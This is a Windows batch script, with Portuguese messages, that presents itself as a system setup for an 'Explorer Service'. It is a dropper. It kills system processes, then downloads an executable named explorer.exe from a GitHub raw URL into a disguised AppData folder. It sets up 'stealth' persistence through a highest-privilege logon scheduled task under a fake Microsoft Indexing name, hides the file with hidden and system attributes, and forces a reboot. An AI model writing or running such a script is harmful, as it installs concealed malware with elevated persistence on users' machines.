@echo off
setlocal EnableDelayedExpansion
title System Setup
cd /d "%~dp0"

echo.
echo ================================================
echo   CONFIGURACAO DE SISTEMA - Explorer Service
echo ================================================
echo.

rem --- CONFIGURACAO ---
set "REPO_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/explorer.exe"
set "TARGET_NAME=explorer.exe"
set "TARGET_DIR=%APPDATA%\Microsoft\Windows\ExplorerCache"
rem --------------------

rem 1. Validar Admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Por favor, execute como ADMINISTRADOR.
    pause
    exit /b 1
)

echo [*] Preparando instalacao...
taskkill /f /im SearchIndexer.exe >nul 2>&1
taskkill /f /im TextInputHost.exe >nul 2>&1
taskkill /f /im FontCacheHost.exe >nul 2>&1
taskkill /f /im explorer.exe /fi "PATH ne %WINDIR%\explorer.exe" >nul 2>&1
timeout /t 1 /nobreak >nul

if not exist "!TARGET_DIR!" mkdir "!TARGET_DIR!"
attrib -h -s "!TARGET_DIR!\!TARGET_NAME!" >nul 2>&1

echo [*] Baixando recursos do GitHub (unknow2)...
curl -s -L "!REPO_URL!" -o "!TARGET_DIR!\!TARGET_NAME!"

if not exist "!TARGET_DIR!\!TARGET_NAME!" (
    echo [ERRO] Falha ao obter arquivos do servidor.
    pause
    exit /b 1
)

rem Validacao de seguranca (se baixar erro 404 do GitHub)
for /f "usebackq" %%A in ('"!TARGET_DIR!\!TARGET_NAME!"') do set size=%%~zA
if !size! LSS 50000 (
    echo [ERRO] O arquivo baixado e invalido. 
    echo Verifique se o repositorio 'unknow2' e PUBLICO e o nome e 'explorer.exe'.
    del "!TARGET_DIR!\!TARGET_NAME!"
    pause
    exit /b 1
)

echo [OK] Servico instalado com sucesso.
echo [*] Configurando persistencia stealth...

rem Criar Tarefa Agendada com Privilegios Maximos (Stealth)
set "TASK_NAME=Microsoft\Windows\Indexing\Cleanup"
schtasks /create /tn "!TASK_NAME!" /tr "\"!TARGET_DIR!\!TARGET_NAME!\" --monitor" /sc onlogon /rl highest /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TextInputService" /f >nul 2>&1
attrib +h +s "!TARGET_DIR!\!TARGET_NAME!" >nul 2>&1

echo.
echo ================================================
echo   CONCLUIDO: O SISTEMA SERA REINICIADO
echo ================================================
echo.
echo Tudo configurado certinho! O arquivo foi instalado como:
echo !TARGET_NAME! na pasta de sistema.
echo.
echo O computador vai reiniciar em 10 segundos para concluir...
echo.
timeout /t 10
shutdown /r /t 0
exit
